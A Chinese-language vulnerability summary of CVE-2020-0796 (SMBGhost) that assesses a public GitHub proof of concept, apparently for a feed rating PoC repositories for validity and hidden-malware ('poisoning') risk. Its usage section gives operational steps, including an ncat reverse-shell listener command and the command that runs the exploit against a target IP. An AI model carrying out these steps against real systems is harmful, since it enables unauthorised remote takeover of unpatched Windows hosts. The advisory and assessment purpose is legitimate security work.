## CVE-2020-0796-SMBGhost-远程代码执行

**漏洞编号:** CVE-2020-0796

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows SMBv3

**危害等级:** 高危，可能导致远程代码执行，完全控制受影响系统

**影响版本:** Windows 10 Version 1903/1909, Windows Server, version 1903/1909 (Server Core installation)

**利用条件:** 目标系统开启SMB服务，且未安装相应的安全补丁。需要能够与目标系统的445端口建立连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2020-0796，又名SMBGhost，是一个存在于Microsoft Server Message Block 3.1.1 (SMBv3) 协议中的远程代码执行漏洞。该漏洞是由于SMBv3处理特定请求的方式不当引起的。攻击者可以通过发送特制的SMBv3数据包到易受攻击的SMBv3服务器来利用此漏洞，成功利用可能允许未经身份验证的攻击者在目标系统上执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且存在公开可用的PoC代码。多个安全厂商和机构已经确认了该漏洞的存在和危害。
提供的PoC代码（`SMBleedingGhost.py`和相关文件）旨在利用CVE-2020-0796实现远程代码执行。根据`README.md`的描述，该PoC的预期结果是在目标系统上获得反向shell。

**投毒风险：**
分析PoC代码可以发现，该代码需要用户手动运行`calc_target_offsets.bat`脚本以获取目标系统的内存偏移地址，然后手动将这些偏移量配置到`SMBleedingGhost.py`中。此外，还需要用户自行搭建ncat监听端口。
因此，投毒风险较低。虽然PoC本身的代码可以被修改以包含恶意代码，但由于存在用户参与和配置的步骤，增加了投毒的难度，也更容易被发现。同时作者明确声明了免责声明，代码仅用于学习和测试。
根据代码分析与常规开源项目，投毒可能性为10%。

**利用方式：**
1.  **环境准备：** 攻击者需要安装Python和ncat。
2.  **获取偏移：** 在目标系统上运行`calc_target_offsets.bat`，获取`srvnet!SrvNetWskConnDispatch`, `srvnet!imp_IoSizeofWorkItem`, `srvnet!imp_RtlCopyUnicodeString`, `nt!IoSizeofWorkItem` 和 `nt!MiGetPteAddress` 的内存偏移地址。
3.  **配置PoC：** 将获取的偏移地址更新到`SMBleedingGhost.py`文件的`OFFSETS`变量中。
4.  **监听端口：** 使用ncat监听指定端口，例如`ncat -lvp 4444`。
5.  **运行PoC：** 运行`SMBleedingGhost.py <target_ip> <reverse_shell_ip> <reverse_shell_port>`，其中`<target_ip>`是目标系统的IP地址，`<reverse_shell_ip>`是攻击者监听的IP地址，`<reverse_shell_port>`是攻击者监听的端口。
6.  **获取Shell：** 如果漏洞利用成功，ncat会接收到来自目标系统的反向shell，从而允许攻击者在目标系统上执行任意命令。

总而言之，该漏洞利用涉及 SMBv3 协议处理压缩数据包时存在的缓冲区溢出。攻击者通过精心构造恶意的 SMBv3 请求，触发缓冲区溢出，覆盖内存中的关键数据，最终实现远程代码执行。该漏洞是“wormable”的，这意味着它有可能在网络上自我传播。

**项目地址:** [monjheta/CVE-2020-0796](https://github.com/monjheta/CVE-2020-0796)

**漏洞详情:** [CVE-2020-0796](https://nvd.nist.gov/vuln/detail/CVE-2020-0796)